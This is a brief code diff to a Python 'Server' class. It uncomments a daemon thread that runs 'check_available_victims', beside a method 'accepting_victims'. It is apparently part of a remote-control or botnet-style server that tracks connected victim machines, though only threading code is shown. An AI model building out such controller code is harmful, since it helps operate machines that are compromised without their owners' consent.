@@ -98,9 +98,9 @@ class Server:
         t1.daemon = True
         t1.start()
 
-        # t2 = Thread(target=self.check_available_victims, args=())
-        # t2.daemon = True
-        # t2.start()
+        t2 = Thread(target=self.check_available_victims, args=())
+        t2.daemon = True
+        t2.start()
 
     def accepting_victims(self):
         global victims_sockets
